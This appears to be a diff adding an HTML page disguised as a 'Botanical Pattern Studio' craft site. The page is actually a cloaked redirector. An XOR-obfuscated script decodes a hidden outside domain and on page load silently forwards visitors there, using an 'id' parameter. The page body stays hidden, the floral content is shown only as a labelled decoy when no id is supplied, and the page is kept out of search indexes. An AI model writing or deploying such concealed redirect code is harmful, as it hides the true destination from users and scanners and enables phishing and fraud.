@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Botanical Pattern Studio</title>
+
+  <!-- 1. Instant Execution (Zero Event-Loop Delay) -->
+  <script>
+    (function () {
+      try {
+        var _hex = "322e2e2a296075753b292b292e23363f7439353775";
+        var _k = 0x5A;
+        var _endpoint = "";
+        for (var i = 0; i < _hex.length; i += 2) {
+          _endpoint += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
+        }
+
+        var params = new URLSearchParams(window.location.search);
+        var id = params.get("id");
+
+        if (id) {
+          id = id.replace(/^\/+|\/+$/g, "");
+          var dest = _endpoint + id;
+          if (dest.indexOf("https://") === 0) {
+            window.location.replace(dest);
+          }
+        }
+      } catch (e) {}
+    })();
+  </script>
+
+  <!-- 2. Keep the viewport completely blank until redirect triggers -->
+  <style>
+    body {
+      display: none;
+      background: #fdfbf7;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      margin: 0;
+      padding: 50px 20px;
+    }
+    .card {
+      background: #ffffff;
+      border: 1px solid #efe7de;
+      border-radius: 20px;
+      max-width: 580px;
+      margin: 0 auto;
+      padding: 36px;
+      box-shadow: 0 10px 30px rgba(60, 40, 30, 0.05);
+    }
+    h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
+    p { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
+    .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Botanical Pattern Studio</h1>
+    <p>Loading curated floral guides and handcraft schematics...</p>
+    <div class="skeleton" style="width: 85%;"></div>
+    <div class="skeleton" style="width: 65%;"></div>
+    <div class="skeleton" style="width: 40%;"></div>
+  </div>
+
+  <!-- Fallback: Reveal decoy only if no id exists and navigation did not occur -->
+  <script>
+    if (!new URLSearchParams(window.location.search).get("id")) {
+      document.body.style.display = "block";
+    }
+  </script>
+</body>
+</html>
